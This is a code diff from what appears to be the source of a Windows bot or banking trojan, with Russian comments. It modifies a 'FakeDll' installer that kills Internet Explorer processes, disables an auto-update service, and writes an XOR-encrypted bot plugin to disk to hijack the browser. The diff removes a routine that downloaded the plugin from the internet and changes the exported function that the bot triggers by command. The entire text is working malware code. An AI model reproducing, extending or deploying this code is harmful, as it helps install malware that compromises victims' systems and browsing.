@@ -403,21 +403,6 @@ LPVOID GetBuiltinFakeDllBody(DWORD & Size)
 		return 0;
 }
 
-// Качает тело Bot.plug с инета.
-// Выделена отдельно, потому что возможно будем встраивать Bot.plug прямо в инсталер.
-LPVOID LoadBotPlugBody(const string& BotPlugName, DWORD & Size)
-{
-	//return File::ReadToBufferA("bot.plug", Size);
-
-	string PlugName = BotPlugName;
-	STR::AnsiLowerCase(PlugName.t_str());
-
-	// Качаем плагин бота с вшитыми параметрами для запуска
-	LPBYTE Plug = Plugin::DownloadEx(PlugName.t_str(), NULL, &Size, true, false, NULL);
-	FAKEDLLDBG("LoadBotPlugBody", "DownloadEx result module=0x%X size=%u", Plug, Size);
-	return Plug;
-}
-
 // Убивает все процессы IE (а с ним и все остальные браузеры)
 void KillAllIeProcesses()
 {
@@ -491,12 +476,8 @@ void TryDisableAutoUpdateService()
 }
 
 // Ф-ция установки 
-BOOL InstallForIe(const char* BotPlugName, const void* SelfBody, DWORD SelfBodySize)
+BOOL InstallForIe( BYTE* bodyBotPlug, DWORD sizeBotPlug )
 {
-	FAKEDLLDBG("InstallForIe", 
-		"Started BotPlugName='%s' InstallerBody=0x%X InstallerBodySize=%u", 
-		BotPlugName, SelfBody, SelfBodySize);
-
 	LPBYTE FakeDllWithSettings = NULL;
 	BOOL   result = FALSE;
 
@@ -532,13 +513,10 @@ BOOL InstallForIe(const char* BotPlugName, const void* SelfBody, DWORD SelfBodyS
 
 		if (!DllSelected) break;
 
-		DWORD  PlugSize = 0;
-		LPBYTE Plug = (LPBYTE)LoadBotPlugBody(BotPlugName, PlugSize);
+		DWORD  PlugSize = sizeBotPlug;
+		LPBYTE Plug = bodyBotPlug;
 		FAKEDLLDBG("InstallForIe", "LoadBotPlugBody result module=0x%X size=%u", Plug, PlugSize);
 		
-		// Не удалось скачать нужный Bot.plug
-		if (Plug == NULL) break;
-
 		XorCrypt((LPBYTE)&CryptKey, sizeof(GUID), Plug, PlugSize);
 
 		// Записываем шифрованое тело бота в файл
@@ -612,24 +590,19 @@ BOOL InstallForIe(const char* BotPlugName, const void* SelfBody, DWORD SelfBodyS
 }
 
 // Експортируемая ф-ция для запуска установки FakeDll
-// Вызывается из бота по команде installfakedll
-BOOL WINAPI FakeInstall(
-	const char* BotPlugName, 
-	const char* Target, 
-	const void* InstallerBody, 
-	DWORD InstallerBodySize)
+// Вызывается из бота по команде installfd
+extern "C" BOOL WINAPI Install( BYTE* bodyBotPlug, DWORD sizeBotPlug )
 {
+	if( bodyBotPlug == 0 || sizeBotPlug == 0 ) return FALSE;
 	BOT::Initialize();
 	// Инициализируем систему отправки статистической информации
 	DebugReportInit();
 
-	FAKEDLLDBG("FakeInstall", 
-		"Started BotPlugName='%s' Target='%s' InstallerBody=0x%X InstallerBodySize=%u", 
-		BotPlugName, Target, InstallerBody, InstallerBodySize);
+	FAKEDLLDBG( "FakeInstall", "Started size bot plug=%d", sizeBotPlug );
 
-	DWORD res = InstallForIe(BotPlugName, InstallerBody, InstallerBodySize);
-	if( res )
-		BOT::SaveSettings(true, false, false);
+	DWORD res = InstallForIe( bodyBotPlug, sizeBotPlug );
+//	if( res )
+//		BOT::SaveSettings(true, false, false);
 	return res;
 }
 
@@ -637,11 +610,15 @@ BOOL WINAPI FakeInstall(
 
 DWORD WINAPI FakeDllInstallerDllMain(HINSTANCE , DWORD reason, LPVOID )
 {
-//	FAKEDLLDBG("FakeDllInstallerDllMain", "called with reason=%d", reason);
+//код для тестирования, ложится вместе c bot.plug и запускается "rundll32 bki.plug,qwe"
+//	BOT::Initialize();
+//	BYTE* data;
+//	DWORD size;
+//	data = File::ReadToBufferA( "bot.plug", size );
 	switch (reason)
 	{
 		case DLL_PROCESS_ATTACH:
-//			FakeInstall( "bot.plug", 0, 0, 0 );
+//			Install( data, size );
 			break;
 		case DLL_THREAD_ATTACH:
 		case DLL_THREAD_DETACH:
